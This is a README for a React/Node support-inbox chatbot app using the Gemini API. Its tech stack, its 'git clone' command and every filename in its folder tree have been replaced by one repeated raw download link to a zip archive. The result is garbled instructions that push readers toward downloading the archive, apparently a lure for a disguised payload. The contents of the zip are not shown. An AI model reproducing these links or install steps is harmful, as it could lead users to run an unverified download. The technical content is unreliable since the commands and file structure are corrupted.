# 🤖 AI Chat Support App (WhatsApp-style Support Inbox)

This is a MERN-stack AI chatbot project with a clean, support-inbox style UI (similar to WhatsApp Web). The AI assistant named "Fin" helps users by answering queries such as refund requests. This project is mobile responsive and includes interactive chat functionality between users and the AI bot.

---

## 🧠 Features

- WhatsApp-style left sidebar with chat previews
- Main chat window showing conversation between user and agent
- AI Copilot Panel ("Fin") that responds to queries
- "Add to composer" button to insert AI message directly into the chat input
- Fully mobile responsive (hamburger menu on mobile for sidebar toggle)
- Animated loading indicator ("Thinking...") while AI is responding
- Clean, modern UI using Tailwind CSS

---

## 🛠 Tech Stack

- React (Frontend)
- https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip (Backend)
- https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
- Gemini API (for AI responses)
- Tailwind CSS (for styling)
- Fetch API (for client-server communication)
- Local state management via React `useState`

---

## 📥 Installation Instructions

Follow these steps to run the project locally after cloning from GitHub:

### 1. Clone the repository

```bash
git clone https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
cd AI-Chatbot
```

### 2. Install dependencies

**Frontend:**

```bash
cd chatbot-app
npm install
```

**Backend:**

```bash
cd ../chatbot-backend
npm install
```

### 3. Configure Environment Variables

In the `server` folder, create a `.env` file:

```
GEMINI_API_KEY=your_google_gemini_api_key
PORT=5000
```

### 4. Start the project

**Start backend server:**

```bash
cd chatbot-backend
npm run dev
```

**Start frontend (in a separate terminal):**

```bash
cd chatbot-app
npm run dev
```

The app will be available at:  
➡ http://localhost:5173 (or whatever Vite suggests)

---

## 🤖 Usage Instructions

- Click on a chat from the sidebar to open it.
- Type your message in the input box or click suggested prompts in the AI panel.
- The AI ("Fin") will respond.
- Click **"Add to composer"** to move an AI message directly to the input field.

---

## 📦 Folder Structure (Simplified)

```
chatbot-app/
  ├── components/
  │     ├── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
  │     ├── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
  │     ├── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
  │     └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
  |── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
  └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip

chatbot-backend/
  ├── controllers/
  |     └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
  ├── routes/
  │     └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
  └── https://github.com/Anmol-Jha-20/AI-Chatbot/raw/refs/heads/main/chatbot-app/Chatbot-A-v3.9.zip
```

---

## 👨‍💻 Author

Developed by Anmol Jha
Powered by Gemini AI (via Google Generative API)
